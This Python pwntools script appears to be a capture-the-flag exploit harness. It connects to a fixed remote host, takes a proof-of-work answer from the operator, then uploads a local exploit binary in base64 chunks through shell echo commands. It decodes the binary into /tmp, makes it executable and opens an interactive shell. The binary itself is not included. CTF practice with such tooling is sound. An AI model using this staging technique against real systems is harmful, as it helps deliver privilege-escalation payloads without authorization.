#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
file = './exploit'
context.log_level = 'info'
context.newline = b'\r\n'
host, port = '152.42.183.87', 10022

# =========================================================
#                         EXPLOITS
# =========================================================
is_root = False
def run(cmd):
    ch = b'# '
    if not is_root:
        ch = b'$ '
    io.sendlineafter(ch, cmd)
    return io.recvline()

def solve_pow():
    io.recvuntil(b'work: ')
    cmd = io.recvline()
    print(cmd)

def upload_payload():
    with open(file, 'rb') as f:
        payload = base64.b64encode(f.read()).decode()    
    for i in range(0, len(payload), 512):
        print(f'Uploading... {i:x} / {len(payload):x}')
        run(f'echo "{payload[i:i+512]}" >> /tmp/b64exp'.encode())
    run(b'base64 -d /tmp/b64exp > /tmp/exploit')
    run(b'rm /tmp/b64exp')
    run(b'chmod +x /tmp/exploit')

def exploit():
    global io
    io = remote(host, port)

    header = io.recvuntil(b'solution:').strip()
    print(header)
    pow = input("pow >> ")
    io.sendline(pow.encode())

    upload_payload()

    io.interactive()

if __name__ == '__main__':
    exploit()